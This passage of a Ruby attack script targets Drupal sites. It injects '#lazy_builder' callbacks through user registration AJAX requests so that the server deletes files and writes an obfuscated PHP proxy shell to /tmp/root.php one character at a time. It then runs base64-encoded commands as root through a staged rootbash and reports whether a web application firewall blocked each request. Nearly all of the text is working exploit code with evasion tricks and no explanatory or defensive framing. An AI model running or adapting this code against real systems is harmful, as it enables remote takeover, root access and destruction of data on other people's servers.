                      "&timezone[a][#lazy_builder][1][]=#{fp_tmp}"
      resp = http_request(url, "post", payload_chunk, $session_cookie)
      if upstream_blocked?(resp)
        print "X"
      else
        print "."
        success_count += 1
      end
      $stdout.flush
    end
    puts "]"
    
    if success_count < chunks.length
      puts error("Unlink (Upload Phase) blocked by WAF")
      next
    end

    exec_url, exec_payload = gen_evil_url("php /tmp/u", $element, true)
    resp_exec = http_request(exec_url, "post", exec_payload, $session_cookie)
    
    if upstream_blocked?(resp_exec)
      puts error("Unlink (Execute Phase) blocked by WAF")
    else
      puts success("Unlink executed! Target '#{file_path}' deleted")
    end
    next
  end

  # ── Execute ───────────────────────────────────────────────────────────────
  # Automatically execute all unhandled commands using the blazing fast root proxy shell
  
  if $root_shell_uploaded.nil?
    print "\n[?] Do you want to re-upload the fast proxy shell to /tmp/root.php? (y/N): "
    ans = $stdin.gets.chomp.downcase
    if ans != 'y'
      $root_shell_uploaded = true
      puts info("Root shell already staged! Skipping upload.")
    else
      $root_shell_uploaded = false
      puts info("First run: Staging blazing fast root shell...")
    
    php_proxy = "<?php " \
      "$p=chr(112).chr(97).chr(115).chr(115).chr(116).chr(104).chr(114).chr(117);" \
      "$b=chr(98).chr(97).chr(115).chr(101).chr(54).chr(52).chr(95).chr(100).chr(101).chr(99).chr(111).chr(100).chr(101);" \
      "$e=chr(101).chr(115).chr(99).chr(97).chr(112).chr(101).chr(115).chr(104).chr(101).chr(108).chr(108).chr(97).chr(114).chr(103);" \
      "$cmd=$b($argv[1]);" \
      "$prefix=chr(47).chr(116).chr(109).chr(112).chr(47).chr(114).chr(111).chr(111).chr(116).chr(98).chr(97).chr(115).chr(104).chr(32).chr(45).chr(112).chr(32).chr(45).chr(99).chr(32);" \
      "$p($prefix.$e($cmd));" \
      "?>"

    require 'uri'
    url = $target + $clean_url + $form + "?element_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
    
    fp_tmp = URI.encode_www_form_component("/tmp/root.php")
    
    # 0. Delete the file first to prevent duplicate execution blocks
    payload_clear = "form_id=user_register_form&_drupal_ajax=1" \
                    "&timezone[a][#lazy_builder][]=unlink" \
                    "&timezone[a][#lazy_builder][1][]=#{fp_tmp}"
    http_request(url, "post", payload_clear, $session_cookie)
    
    # 1. Upload in 1-character chunks
    chunks = php_proxy.scan(/.{1,1}/m)
    print "    Uploading PHP proxy (#{chunks.length} chunks): ["
    success_count = 0
    chunks.each do |chunk|
      chunk_enc = URI.encode_www_form_component(chunk)
      payload_chunk = "form_id=user_register_form&_drupal_ajax=1" \
                      "&timezone[a][#lazy_builder][]=error_log" \
                      "&timezone[a][#lazy_builder][1][]=#{chunk_enc}" \
                      "&timezone[a][#lazy_builder][1][]=3" \
                      "&timezone[a][#lazy_builder][1][]=#{fp_tmp}"
      resp = http_request(url, "post", payload_chunk, $session_cookie)
      if upstream_blocked?(resp)
        print "X"
      else
        print "."
        success_count += 1
      end
      $stdout.flush
    end
    puts "]"
    
    if success_count < chunks.length
      puts error("Proxy (Upload Phase) blocked by WAF")
      next
    end
    
    $root_shell_uploaded = true
    puts success("Fast proxy shell staged at /tmp/root.php")
    end
  end
  
  # Fast execution (1 request)
  require 'base64'
  b64_cmd = Base64.strict_encode64(full_command)
  
  exec_url, exec_payload = gen_evil_url("php /tmp/root.php #{b64_cmd}", $element, true)
  resp_exec = http_request(exec_url, "post", exec_payload, $session_cookie)
  
  if upstream_blocked?(resp_exec)
    puts error("Command blocked by WAF")
  else
    puts clean_result(resp_exec.body)
  end
end

